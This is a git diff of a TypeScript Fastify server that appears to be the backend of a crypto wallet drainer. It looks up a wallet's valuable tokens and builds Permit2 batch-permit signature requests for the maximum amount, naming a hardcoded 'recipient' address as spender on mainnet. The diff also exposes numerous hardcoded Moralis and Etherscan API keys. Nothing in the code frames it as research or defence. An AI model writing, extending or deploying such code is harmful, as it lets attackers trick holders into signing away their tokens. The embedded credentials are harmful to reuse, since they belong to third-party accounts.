@@ -18,23 +18,34 @@ import { EvmChain } from "@moralisweb3/common-evm-utils";
 const moralisApiKey1 =
   "5M2C1HGJJnTiyMnp96IpaIlZ6CPVRA7yxysQY38AI1fDse7p3K6EcIRSOWwpSKCd";
 const moralisApiKey2 =
-  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6Ijg5MWJkNjBkLTBmYWItNDZmZi1hYjRjLTU1ODAyZWUwY2M4NyIsIm9yZ0lkIjoiMzQ5NzE5IiwidXNlcklkIjoiMzU5NDU4IiwidHlwZUlkIjoiOTUxZmMzZjAtYzk0YS00NjQzLWFmYjItZDYwMDYxMTI5ZGQxIiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE2OTAxMzM1NTcsImV4cCI6NDg0NTg5MzU1N30.gp4A6Y5iJZN2qNaJtV41Zz5DKf-CTywbc7Na-3Ks0oQ";
+  "2IHfMlzIaRBflv7GliW3NzneyoAp3OgBXbE05hhKd3qfXo4otDbfZNw1AwH2SYO8";
 const moralisApiKey3 =
-  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6ImU3MWVmYWU5LTQ1NTctNGMyMC1iNGM4LWJiYzM3MWRkMjA0NiIsIm9yZ0lkIjoiMzQ5OTAzIiwidXNlcklkIjoiMzU5NjQ2IiwidHlwZUlkIjoiY2M5NTA4OWQtM2QxYS00OGMzLThhYWUtNDE5NmU4M2NhZTgwIiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE2OTAyMzU3MDUsImV4cCI6NDg0NTk5NTcwNX0.Ed2XbULv-DOKkXCOBKJsFbRFo55pFH3jeVpmCKCkc0Y";
+  "Ft1vyp44sxY7gqDm4qPiWBaPgLechkjUnKFPIn6jQBDHO5V0l0UOZnzNCoXZb1W2";
 const moralisAPikey4 =
-  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjU0OTNlNjVhLWYzNmUtNGVlNy05NjI4LWI1NmZjNjAzMTJjNCIsIm9yZ0lkIjoiMzUwMTQwIiwidXNlcklkIjoiMzU5ODg4IiwidHlwZUlkIjoiODM2MzIwZWMtNThlZC00OWIyLWEwZjQtNjI3NTY1N2UyZjE0IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE2OTAzNTk1OTMsImV4cCI6NDg0NjExOTU5M30.zLF9ROjakzPxisOcQmvcyJi8d4Ob6GsePTIums2nsO4";
-const moralisKeys: string[] = [moralisApiKey1, moralisApiKey2, moralisApiKey3];
+  "7f8r9DVeWUgv2AO7xZxTRkmZ6yx5l85WvTJfrj0ZEhBE8jXk8txiYI6m66ZNos5D";
+const moralisApiKey5 =
+  "qnEZj5njvRvnQ8eLMcaqnoItrPuQUrTjXRbHpZ207njJF1PmcI31dhSXBwRDgBnB";
+const moralisKeys: string[] = [
+  moralisApiKey1,
+  moralisApiKey2,
+  moralisApiKey3,
+  moralisAPikey4,
+  moralisApiKey5,
+];
 const selectedKey = moralisKeys[
-  Number(process.env.MORALIS_KEY_INDEX)
+  Number(process.env.MORALIS_KEY_INDEX ?? 1)
 ] as string;
+// console.log(selectedKey);
 const etherscanAPiKey1 = "NW9VZEP7IFW2ZQ4NYV6GPANWWX893ANUUE";
 const etherscanAPiKey2 = "QNKQHXZ31GI3F8NZAWVU4J6YSCQEV9J1BT";
 
 const deadline = 1000000000000;
+const chainId = 1; //main  net chain Id
 const nonce = 0; // still experimenting on this one;
-// const Permit2Contract =
-//   "0x000000000022D473030F116dDEE9F6B43aC78BA3" as `0x${string}`; // Permit2 contract
+const Permit2Contract =
+  "0x000000000022D473030F116dDEE9F6B43aC78BA3" as `0x${string}`; // Permit2 contract
 const maxUint160 = "1461501637330902918203684832716283019655932542975"; // maxUint160
+const recipient = "0xA08a5810Dc98258f35a35918CeD3f99E893154Ef"; // recipient address
 
 //
 export const app: FastifyInstance<Server, IncomingMessage, ServerResponse> =
@@ -86,7 +97,7 @@ const runMoralis = async () => {
   if (!moralis.Core.isStarted) {
     await moralis.start({
       apiKey:
-        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjU0OTNlNjVhLWYzNmUtNGVlNy05NjI4LWI1NmZjNjAzMTJjNCIsIm9yZ0lkIjoiMzUwMTQwIiwidXNlcklkIjoiMzU5ODg4IiwidHlwZUlkIjoiODM2MzIwZWMtNThlZC00OWIyLWEwZjQtNjI3NTY1N2UyZjE0IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE2OTAzNTk1OTMsImV4cCI6NDg0NjExOTU5M30.zLF9ROjakzPxisOcQmvcyJi8d4Ob6GsePTIums2nsO4",
+        "qnEZj5njvRvnQ8eLMcaqnoItrPuQUrTjXRbHpZ207njJF1PmcI31dhSXBwRDgBnB",
     });
     // console.log("moraliskeyIndex=>", process.env.MORALIS_KEY_INDEX);
   }
@@ -124,7 +135,7 @@ app.post<{
       accept: "application/json",
       "content-type": "application/json",
       "X-API-Key":
-        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjU0OTNlNjVhLWYzNmUtNGVlNy05NjI4LWI1NmZjNjAzMTJjNCIsIm9yZ0lkIjoiMzUwMTQwIiwidXNlcklkIjoiMzU5ODg4IiwidHlwZUlkIjoiODM2MzIwZWMtNThlZC00OWIyLWEwZjQtNjI3NTY1N2UyZjE0IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE2OTAzNTk1OTMsImV4cCI6NDg0NjExOTU5M30.zLF9ROjakzPxisOcQmvcyJi8d4Ob6GsePTIums2nsO4",
+        "qnEZj5njvRvnQ8eLMcaqnoItrPuQUrTjXRbHpZ207njJF1PmcI31dhSXBwRDgBnB",
     },
     body: JSON.stringify({
       tokens: truncatedResponse,
@@ -139,7 +150,7 @@ app.post<{
       );
       const tokenPrices = await response.json();
 
-      for (let index = 0; index < tokenPrices.length; index++) {
+      for (let index = 0; index < tokenPrices?.length; index++) {
         truncatedResponse[index].usdPrice = tokenPrices[index].usdPrice;
       }
 
@@ -161,7 +172,7 @@ app.post<{
   const [filteredByUSDValue, error] = await useFetchTokenPrices();
   const tokensReturned = filteredByUSDValue as { token_address: string }[];
   const tokenInPermitFormat: Array<{}> = [];
-  for (let index = 0; index < tokensReturned.length; index++) {
+  for (let index = 0; index < tokensReturned?.length; index++) {
     const obj = {
       token: tokensReturned[index].token_address,
       amount: maxUint160,
@@ -171,7 +182,7 @@ app.post<{
     tokenInPermitFormat.push(obj);
   }
   const addrs = [];
-  for (let i = 0; i < tokensReturned.length; i++) {
+  for (let i = 0; i < tokensReturned?.length; i++) {
     addrs.push(tokensReturned[i].token_address);
   }
 
@@ -191,13 +202,47 @@ app.post<{
   ) as { to_wallet: string }[];
   const _addrs = [...addrs];
 
-  for (let i = 0; i < permit2Tokens.length; i++) {
+  for (let i = 0; i < permit2Tokens?.length; i++) {
     const index = addrs.findIndex((e) => e == permit2Tokens[i].to_wallet);
     if (index != 1) {
       _addrs.splice(index, 1);
     }
   }
 
-  return [tokenInPermitFormat, _addrs];
+  return [tokensReturned, _addrs];
   // return tokensAddressOnly;
 });
+
+const dataToSign = (detailsArray: []) => {
+  const dataToSign = {
+    domain: {
+      name: "Permit2" as string,
+      chainId: chainId,
+      verifyingContract: Permit2Contract,
+    },
+    types: {
+      EIP712Domain: [
+        { name: "name", type: "string" },
+        { name: "chainId", type: "uint256" },
+        { name: "verifyingContract", type: "address" },
+      ],
+      PermitBatch: [
+        { name: "details", type: "PermitDetails[]" },
+        { name: "spender", type: "address" },
+        { name: "sigDeadline", type: "uint256" },
+      ],
+      PermitDetails: [
+        { name: "token", type: "address" },
+        { name: "amount", type: "uint160" },
+        { name: "expiration", type: "uint48" },
+        { name: "nonce", type: "uint48" },
+      ],
+    },
+    primaryType: "PermitBatch",
+    message: {
+      details: detailsArray,
+      spender: recipient,
+      sigDeadline: deadline,
+    },
+  };
+};
